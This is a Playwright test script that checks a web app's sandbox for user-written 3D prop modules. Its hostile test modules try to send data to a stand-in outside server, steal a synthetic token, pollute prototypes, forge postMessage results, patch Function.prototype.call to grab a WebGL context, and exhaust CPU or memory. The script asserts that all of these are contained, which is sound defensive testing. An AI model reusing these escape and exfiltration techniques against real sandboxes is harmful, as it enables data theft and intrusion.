// Headless proof of the prop sandbox (#42): hostile prop modules are contained,
// the home stays responsive and nothing hostile is placed or leaks an error.
// Starts its own dev server on 5304 (Vite's API, with a request counter) on a
// throwaway VILLAGE_ROOT holding a synthetic villager token, and an "outside"
// server on a random port that must never be reached. Stops both at the end.
// Usage: node scripts/check-prop-sandbox.mjs
// Exits non-zero when any check fails.
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises'
import http from 'node:http'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { chromium } from 'playwright'

const homeDir = join(dirname(fileURLToPath(import.meta.url)), '..')
const root = await mkdtemp(join(tmpdir(), 'prop-sandbox-'))
await mkdir(join(root, 'villager'))
const token = `synthetic-${Math.random().toString(36).slice(2)}`
await writeFile(join(root, 'villager', 'launch.json'), JSON.stringify({ port: 1, token }))
process.env.VILLAGE_ROOT = root

// The dev server, counting requests per path so a box request is visible even if the browser hides it.
const served = []
const { createServer } = await import(join(homeDir, 'node_modules/vite/dist/node/index.js'))
const vite = await createServer({
  root: homeDir,
  configFile: join(homeDir, 'vite.config.ts'),
  logLevel: 'warn',
  server: { port: 5304, strictPort: true },
  plugins: [{ name: 'count', configureServer(s) { s.middlewares.use((req, _res, next) => { served.push(req.url); next() }) } }],
})
await vite.listen()
const base = 'http://localhost:5304/'

const outside = []
const outsideServer = http.createServer((req, res) => {
  outside.push(req.url)
  res.setHeader('access-control-allow-origin', '*')
  res.end('outside')
})
await new Promise((r) => outsideServer.listen(0, '127.0.0.1', r))
const OUT = `http://127.0.0.1:${outsideServer.address().port}`

const checks = []
const check = (name, pass, detail) => {
  checks.push({ name, pass: Boolean(pass), detail })
  console.log(`${pass ? 'PASS' : 'FAIL'} ${name}${detail ? `: ${typeof detail === 'string' ? detail : JSON.stringify(detail)}` : ''}`)
}

const browser = await chromium.launch({ channel: 'chrome', headless: true, args: ['--enable-unsafe-webgpu', '--use-angle=metal'] })
const page = await browser.newPage({ viewport: { width: 800, height: 500 } })
const pageErrors = []
const mainConsoleErrors = []
page.on('pageerror', (e) => pageErrors.push(String(e).slice(0, 300)))
page.on('console', (m) => {
  if (m.type() === 'error' && m.location().url.startsWith(base)) mainConsoleErrors.push(m.text().slice(0, 300))
})

try {
  await page.goto(`${base}?cam=iso&q=low&props=none`)
  await page.waitForFunction(() => window.village && window.villageProps, null, { timeout: 30000 })
  await page.evaluate(() => window.village.ready())
  await page.evaluate(() => window.villageProps.loaded)
  await page.waitForTimeout(500)

  // The page records its largest gap between 10 ms ticks, so a stall in the home shows up.
  await page.evaluate(() => {
    window.__gap = 0
    let last = performance.now()
    setInterval(() => {
      const now = performance.now()
      window.__gap = Math.max(window.__gap, now - last)
      last = now
    }, 10)
  })
  const errorsAtStart = { page: pageErrors.length, console: mainConsoleErrors.length }
  // The page loads the villager token once at start; after this no request for it may come.
  const launchHits = () => served.filter((u) => u.startsWith('/villager/launch')).length
  const launchAtStart = launchHits()

  const trial = async (code, opts = {}) => {
    await page.evaluate(() => { window.__gap = 0 })
    const result = await page.evaluate(([c, o]) => window.villageProps.trial(c, o), [code, opts])
    const gap = await page.evaluate(() => window.__gap)
    return { ...result, gap: Math.round(gap) }
  }
  const box = () => page.frames().find((f) => f !== page.mainFrame())
  const CUBE = 'const m = new THREE.Mesh(new THREE.BoxGeometry(0.4, 0.4, 0.4), new THREE.MeshStandardMaterial({ color: "#c96" })); prop.add(m)'
  const wrap = (body) => `export default async function (prop, { THREE, paint }) {\n${body}\n}`

  // 0. A plain module works, so the cases below fail for their own reasons.
  const plain = await trial(wrap(CUBE), { place: true })
  check('a plain module builds and is placed', plain.ok && plain.meshes === 1, { ok: plain.ok, reason: plain.reason, toFrameMs: Math.round(plain.toFrameMs) })
  // The page as it stands with the box started and one trial prop placed.
  const before = await page.evaluate(() => ({
    dom: document.body.querySelectorAll('*').length,
    storage: JSON.stringify(Object.entries(localStorage)),
    cookie: document.cookie,
    protoKeys: Object.getOwnPropertyNames(Object.prototype).length,
    placed: window.villageProps.placed(),
  }))

  // 1. Network from the worker.
  const net = await trial(wrap(`
    const tries = {
      fetch: () => fetch('${OUT}/fetch'),
      xhr: () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', '${OUT}/xhr'); x.onload = res; x.onerror = () => rej(new Error('xhr error')); x.send() }),
      websocket: () => new Promise((res, rej) => { const w = new WebSocket('${OUT.replace('http', 'ws')}/ws'); w.onopen = res; w.onerror = () => rej(new Error('ws error')) }),
      importScripts: async () => importScripts('${OUT}/importScripts.js'),
      import: () => import('${OUT}/import.js'),
      eventsource: () => new Promise((res, rej) => { const e = new EventSource('${OUT}/sse'); e.onopen = res; e.onerror = () => rej(new Error('sse error')) }),
      token: () => fetch('${base}villager/launch').then((r) => r.text()),
      tokenRelative: () => fetch('/villager/launch').then((r) => r.text()),
      beacon: async () => { if (!navigator.sendBeacon) throw new Error('no sendBeacon'); navigator.sendBeacon('${OUT}/beacon', 'x') },
    }
    for (const [name, f] of Object.entries(tries)) {
      try { await f(); prop.note(name + ': REACHED') } catch (e) { prop.note(name + ': blocked (' + String(e && e.message || e).slice(0, 60) + ')') }
    }
    ${CUBE}`))
  await page.waitForTimeout(500)
  check('fetch, XHR, WebSocket, importScripts, import(), EventSource, sendBeacon to an outside URL are blocked', net.ok && outside.length === 0 && !net.notes.some((n) => n.includes('REACHED')), { outsideHits: outside.length, notes: net.notes })
  check('the villager token cannot be fetched from the box', launchHits() === launchAtStart && !net.notes.some((n) => n.startsWith('token') && n.includes('REACHED')), { launchRequests: launchHits() - launchAtStart })

  // 2. The page, its storage and cookies from the worker.
  const reach = await trial(wrap(`
    const probe = { document: typeof document, window: typeof window, parent: typeof parent, top: typeof top, localStorage: typeof localStorage, sessionStorage: typeof sessionStorage, caches: typeof caches, cookieStore: typeof cookieStore, opener: typeof opener }
    prop.note(Object.entries(probe).map(([k, v]) => k + '=' + v[0]).join(','))
    try { await new Promise((res, rej) => { const r = indexedDB.open('x'); r.onsuccess = res; r.onerror = () => rej(r.error) }); prop.note('indexedDB: REACHED') } catch (e) { prop.note('indexedDB: blocked') }
    try { await caches.keys(); prop.note('caches: REACHED') } catch (e) { prop.note('caches: blocked') }
    prop.note('origin ' + self.origin)
    ${CUBE}`))
  const seen = Object.fromEntries((reach.notes?.[0] ?? '').split(',').map((kv) => kv.split('=')))
  check('the worker has no document, window, parent, top, localStorage or cookies', reach.ok && ['document', 'window', 'parent', 'top', 'localStorage', 'sessionStorage', 'opener', 'cookieStore'].every((k) => seen[k] === 'u'), reach.notes?.[0])
  check('the worker cannot open indexedDB or caches, and its origin is opaque', reach.notes?.includes('indexedDB: blocked') && reach.notes?.includes('caches: blocked') && reach.notes?.includes('origin null'), reach.notes?.slice(1))

  // 3. The iframe itself (as if the relay were compromised), probed from outside with Playwright.
  const frame = box()
  const frameProbe = await frame.evaluate(async ([out, launch]) => {
    const r = {}
    const t = async (k, f) => { try { await f(); r[k] = 'REACHED' } catch (e) { r[k] = 'blocked' } }
    await t('parent.document', () => { if (!parent.document) throw new Error('none') })
    await t('top.document', () => { if (!top.document) throw new Error('none') })
    await t('top.location.href', () => { if (!top.location.href) throw new Error('none') })
    await t('localStorage', () => localStorage.length)
    await t('sessionStorage', () => sessionStorage.length)
    await t('cookie', () => document.cookie)
    await t('indexedDB', () => new Promise((res, rej) => { const q = indexedDB.open('x'); q.onsuccess = res; q.onerror = () => rej(q.error) }))
    await t('fetch outside', () => fetch(`${out}/frame`))
    await t('fetch token', () => fetch(launch))
    await t('image outside', () => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = `${out}/img` }))
    await t('navigate top', async () => { top.location.href = `${out}/nav`; await new Promise((s) => setTimeout(s, 300)) })
    await t('open popup', () => { if (!open(`${out}/popup`)) throw new Error('blocked') })
    r.origin = self.origin
    return r
  }, [OUT, `${base}villager/launch`])
  await page.waitForTimeout(500)
  const frameLeaks = Object.entries(frameProbe).filter(([k, v]) => k !== 'origin' && v === 'REACHED').map(([k]) => k)
  check('the iframe cannot reach the page, storage, cookies, network, top navigation or popups', frameLeaks.length === 0 && frameProbe.origin === 'null' && outside.length === 0 && page.url().startsWith(base), { leaks: frameLeaks, outsideHits: outside.length, url: page.url() })

  // 4. Forged results: from the worker with guessed ids, to the parent window, and through the box's own port.
  const forgedWorker = await trial(wrap(`
    for (let id = 0; id < 200; id++) self.postMessage({ type: 'result', id, data: { meshes: [{ geometry: 0, material: 0, matrix: [] }], geometries: [], materials: [{ preset: 'shader', fragmentShader: 'void main(){}' }], textures: [], notes: [] } })
    await new Promise(() => {})`))
  check('a forged result posted by the module is not placed', !forgedWorker.ok, forgedWorker.reason)
  const placedBefore = await page.evaluate(() => window.villageProps.placed())
  await box().evaluate(() => { parent.postMessage({ type: 'result', id: 1, data: {} }, '*'); top.postMessage({ type: 'init' }, '*') })
  await page.waitForTimeout(300)
  check('messages to the parent window are ignored', (await page.evaluate(() => window.villageProps.placed())) === placedBefore && pageErrors.length === errorsAtStart.page)

  // A compromised relay answers a pending run through the real port; the page's validator is the last line.
  // `poster` runs in the box frame (Playwright evaluates it there) and answers every likely id on the relay's port.
  const forge = async (poster) => {
    const pending = page.evaluate((c) => window.villageProps.trial(c, { timeoutMs: 4000 }), wrap('await new Promise((r) => setTimeout(r, 3000))\n' + CUBE))
    await page.waitForTimeout(400)
    await box().evaluate(poster)
    return pending
  }
  const shader = await forge(() => {
    const data = { meshes: [{ geometry: 0, material: 0, matrix: [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1] }], geometries: [{ position: new Float32Array(9), normal: null, uv: null, index: null }], materials: [{ preset: 'shader', fragmentShader: 'void main(){}', color: [1, 1, 1], emissive: [0, 0, 0], emissiveIntensity: 1, roughness: 1, metalness: 0, opacity: 1, transparent: false, depthWrite: true, flatShading: false, side: 'front', map: null }], textures: [], notes: [] }
    for (let id = 1; id < 400; id++) port.postMessage({ type: 'result', id, data, timing: {} })
  })
  check('an unknown material preset from a compromised box is rejected', !shader.ok && /preset/.test(shader.reason), shader.reason)
  const polluted = await forge(() => {
    const data = JSON.parse('{"__proto__": {"polluted": 1}, "constructor": {"prototype": {"polluted": 1}}, "meshes": [{"__proto__": {"polluted": 1}, "geometry": 0, "material": 0, "matrix": [1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]}], "geometries": [{"__proto__": {"x": 1}}], "materials": [], "textures": [], "notes": [] }')
    for (let id = 1; id < 400; id++) port.postMessage({ type: 'result', id, data, timing: {} })
  })
  const pollutedValid = await forge(() => {
    const data = JSON.parse('{"__proto__": {"polluted": 1}, "meshes": [{"__proto__": {"polluted": 1}, "geometry": 0, "material": 0, "matrix": [1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]}], "geometries": [{"__proto__": {"polluted": 1}, "normal": null, "uv": null, "index": null}], "materials": [{"__proto__": {"polluted": 1}, "constructor": {"prototype": {"polluted": 1}}, "preset": "standard", "color": [1,0.5,0.2], "emissive": [0,0,0], "emissiveIntensity": 1, "roughness": 0.5, "metalness": 0, "opacity": 1, "transparent": false, "depthWrite": true, "flatShading": false, "side": "front", "map": null}], "textures": [], "notes": [] }')
    data.geometries[0].position = new Float32Array([0, 0, 0, 0.3, 0, 0, 0, 0.3, 0])
    for (let id = 1; id < 400; id++) port.postMessage({ type: 'result', id, data, timing: {} })
  })
  const clean = await page.evaluate(() => ({ obj: ({}).polluted, arr: [].polluted, keys: Object.getOwnPropertyNames(Object.prototype).length }))
  check('prototype-pollution keys in a forged result do not reach the page', !polluted.ok && clean.obj === undefined && clean.arr === undefined && clean.keys === before.protoKeys, { reason: polluted.reason, ...clean })
  check('a forged but valid result with __proto__ keys is rebuilt from fresh objects, page still clean', pollutedValid.ok && clean.obj === undefined, { ok: pollutedValid.ok, reason: pollutedValid.reason })

  // Prototype pollution inside the worker, then a normal prop.
  const workerPollution = await trial(wrap(`
    Object.prototype.polluted = 1
    Object.defineProperty(Object.prototype, 'preset', { get() { return 'shader' }, set() {}, configurable: true })
    Array.prototype.evil = 'x'
    ${CUBE}`))
  const clean2 = await page.evaluate(() => ({ obj: ({}).polluted, arr: [].evil, keys: Object.getOwnPropertyNames(Object.prototype).length }))
  check('prototype pollution inside the worker does not reach the page', clean2.obj === undefined && clean2.arr === undefined && clean2.keys === before.protoKeys, { ok: workerPollution.ok, reason: workerPollution.reason, ...clean2 })

  // GPU and fresh realms: the CSP does not cover WebGL or nested workers, so the worker removes them.
  const gpu = await trial(wrap(`
    prop.note('webgpu ' + typeof navigator.gpu)
    try { prop.note('webgl2 ' + (new OffscreenCanvas(4, 4).getContext('webgl2') ? 'REACHED' : 'none')) } catch { prop.note('webgl2 blocked') }
    try { prop.note('webgl ' + (new OffscreenCanvas(4, 4).getContext('webgl') ? 'REACHED' : 'none')) } catch { prop.note('webgl blocked') }
    try { Object.defineProperty(OffscreenCanvas.prototype, 'getContext', { value: () => 'REACHED' }); prop.note('redefine REACHED') } catch { prop.note('redefine blocked') }
    prop.note('Worker ' + typeof Worker + ', SharedWorker ' + typeof SharedWorker)
    ${CUBE}`))
  check('no WebGPU, no WebGL and no nested workers in the worker', gpu.ok && ['webgpu undefined', 'webgl2 blocked', 'webgl blocked', 'redefine blocked', 'Worker undefined, SharedWorker undefined'].every((n) => gpu.notes.includes(n)), gpu.notes)

  // Sentinel (#42): steal the real getContext by patching Function.prototype.call and
  // Reflect.apply while asking for a 2d context, then use it for WebGL2.
  const steal = await trial(wrap(`
    let orig = null
    const realCall = Function.prototype.call, realApply = Reflect.apply
    Function.prototype.call = function (...a) { if (!orig && a[1] === '2d') orig = this; return realApply(this, a[0], a.slice(1)) }
    Reflect.apply = function (f, t, args) { if (!orig && args && args[0] === '2d') orig = f; return realApply(f, t, args) }
    new OffscreenCanvas(4, 4).getContext('2d')
    Function.prototype.call = realCall; Reflect.apply = realApply
    let res = 'not stolen'
    if (orig) { try { res = realApply(orig, new OffscreenCanvas(4, 4), ['webgl2']) ? 'REACHED' : 'null' } catch { res = 'blocked' } }
    prop.note('stolen ' + res)
    ${CUBE}`))
  check('the 2d-only rule holds when the module patches Function.prototype.call and Reflect.apply', steal.ok && steal.notes.some((n) => /^stolen (not stolen|blocked)$/.test(n)), steal.notes)
  // Sentinel (#42): a huge type name must not reach the page as a huge note.
  const longType = await trial(wrap(`const o = new THREE.Object3D(); o.type = 'x'.repeat(40 * 1024 * 1024); prop.add(o); ${CUBE}`), { timeoutMs: 8000 })
  check('a huge type name is cut short in the box and does not stall the page', longType.notes.every((n) => n.length <= 200) && longType.gap < 250, { ok: longType.ok, reason: longType.reason, maxGapMs: longType.gap, longest: Math.max(0, ...longType.notes.map((n) => n.length)) })

  // 5. Runaway code.
  const loop = await trial(wrap('while (true) {}'), { timeoutMs: 1500 })
  check('an infinite loop is stopped and the home stays responsive', !loop.ok && /stopped/.test(loop.reason) && loop.gap < 150, { reason: loop.reason, maxGapMs: loop.gap })
  const typed = await trial(wrap('const a = []; for (;;) a.push(new Float64Array(1 << 24))'), { timeoutMs: 4000 })
  check('a huge typed-array allocation is contained', !typed.ok && typed.gap < 250, { reason: typed.reason, maxGapMs: typed.gap })
  const heap = await trial(wrap('const a = []; for (let i = 0; ; i++) a.push({ i, s: "x" + i })'), { timeoutMs: 4000 })
  check('a huge heap allocation is contained', !heap.ok && heap.gap < 250, { reason: heap.reason, maxGapMs: heap.gap })

  // 6. Out-of-limit and broken geometry.
  const million = await trial(wrap('prop.add(new THREE.Mesh(new THREE.PlaneGeometry(1, 1, 1600, 1600), new THREE.MeshStandardMaterial()))'), { timeoutMs: 8000 })
  check('5 million triangles are rejected', !million.ok, million.reason)
  const many = await trial(wrap('prop.add(new THREE.Mesh(new THREE.PlaneGeometry(1, 1, 400, 400), new THREE.MeshStandardMaterial()))'))
  check('320,000 triangles (under the byte cap) are rejected by the triangle limit', !many.ok && /triangles/.test(many.reason), many.reason)
  const nan = await trial(wrap('const g = new THREE.BoxGeometry(0.3, 0.3, 0.3); g.attributes.position.array[4] = NaN; prop.add(new THREE.Mesh(g, new THREE.MeshStandardMaterial()))'))
  check('NaN in positions is rejected', !nan.ok && /finite/.test(nan.reason), nan.reason)
  const inf = await trial(wrap('const g = new THREE.BoxGeometry(0.3, 0.3, 0.3); g.attributes.position.array[0] = Infinity; prop.add(new THREE.Mesh(g, new THREE.MeshStandardMaterial()))'))
  check('Infinity in positions is rejected', !inf.ok && /finite/.test(inf.reason), inf.reason)
  const far = await trial(wrap('const m = new THREE.Mesh(new THREE.BoxGeometry(0.3, 0.3, 0.3), new THREE.MeshStandardMaterial()); m.position.x = 1e6; prop.add(m); prop.add(new THREE.Mesh(new THREE.BoxGeometry(0.3, 0.3, 0.3), new THREE.MeshStandardMaterial()))'))
  check('a prop larger than 4 m is rejected', !far.ok && /4 m/.test(far.reason), far.reason)
  const big = await trial(wrap('const c = new OffscreenCanvas(16384, 16384); c.getContext("2d").fillRect(0, 0, 10, 10); const t = new THREE.CanvasTexture(c); prop.add(new THREE.Mesh(new THREE.BoxGeometry(0.3, 0.3, 0.3), new THREE.MeshStandardMaterial({ map: t })))'), { timeoutMs: 8000 })
  check('a 16384x16384 texture is rejected', !big.ok, big.reason)
  const wide = await trial(wrap('const c = new OffscreenCanvas(16384, 64); c.getContext("2d").fillRect(0, 0, 10, 10); const t = new THREE.CanvasTexture(c); prop.add(new THREE.Mesh(new THREE.BoxGeometry(0.3, 0.3, 0.3), new THREE.MeshStandardMaterial({ map: t })))'))
  check('a 16384-wide texture under the byte cap is rejected by the size limit', !wide.ok && /2048/.test(wide.reason), wide.reason)
  const shaderMat = await trial(wrap('prop.add(new THREE.Mesh(new THREE.BoxGeometry(0.3, 0.3, 0.3), new THREE.ShaderMaterial({ vertexShader: "void main(){}", fragmentShader: "void main(){}" })))'))
  check('a ShaderMaterial (unknown preset) is rejected', !shaderMat.ok && /preset/.test(shaderMat.reason), shaderMat.reason)

  // 7. Modules that do nothing or nothing useful.
  const nothing = await trial('export function build(api) { }')
  check('a module that never calls prop.add is rejected', !nothing.ok && /added nothing/.test(nothing.reason), nothing.reason)
  const syntax = await trial('export function build(api) { return (')
  check('a module that does not parse is rejected', !syntax.ok, syntax.reason)
  const evalCode = await trial(wrap('try { (0, eval)("1"); prop.note("eval: REACHED") } catch { prop.note("eval: blocked") }\ntry { new Function("return 1")(); prop.note("Function: REACHED") } catch { prop.note("Function: blocked") }\n' + CUBE))
  check('eval and new Function are blocked in the worker', evalCode.ok && evalCode.notes.includes('eval: blocked') && evalCode.notes.includes('Function: blocked'), evalCode.notes)

  // 8. The relay thread itself busy (as if compromised): does the home stall? (Says whether the iframe shares its process.)
  await page.evaluate(() => { window.__gap = 0 })
  const busy = box().evaluate(() => { const end = Date.now() + 1500; while (Date.now() < end); }).catch(() => null)
  await page.waitForTimeout(1800)
  await busy
  const relayGap = Math.round(await page.evaluate(() => window.__gap))
  check('a busy iframe main thread does not stall the home (Chrome runs the sandboxed frame in another process)', relayGap < 150, { maxGapMs: relayGap })

  // 9. After all that the box still works, the page is unchanged and no error leaked.
  const after = await trial(wrap(CUBE), { place: true })
  const end = await page.evaluate(() => ({
    dom: document.body.querySelectorAll('*').length,
    storage: JSON.stringify(Object.entries(localStorage)),
    cookie: document.cookie,
    placed: window.villageProps.placed(),
  }))
  check('the box still builds a plain prop afterwards', after.ok, after.reason)
  check('the page DOM, local storage and cookies are unchanged', end.dom === before.dom && end.storage === before.storage && end.cookie === before.cookie, { domBefore: before.dom, domAfter: end.dom })
  check('nothing hostile was placed (only the last trial prop stands)', end.placed === before.placed, { before: before.placed, after: end.placed })
  check('no uncaught error or console error reached the page', pageErrors.length === errorsAtStart.page && mainConsoleErrors.length === errorsAtStart.console, { pageErrors: pageErrors.slice(errorsAtStart.page), console: mainConsoleErrors.slice(errorsAtStart.console) })
  check('the outside server was never reached', outside.length === 0, outside)
} finally {
  await browser.close()
  await vite.close()
  outsideServer.close()
  await rm(root, { recursive: true, force: true })
}

const failed = checks.filter((c) => !c.pass)
console.log(`\n${checks.length - failed.length} of ${checks.length} passed`)
process.exit(failed.length ? 1 : 0)
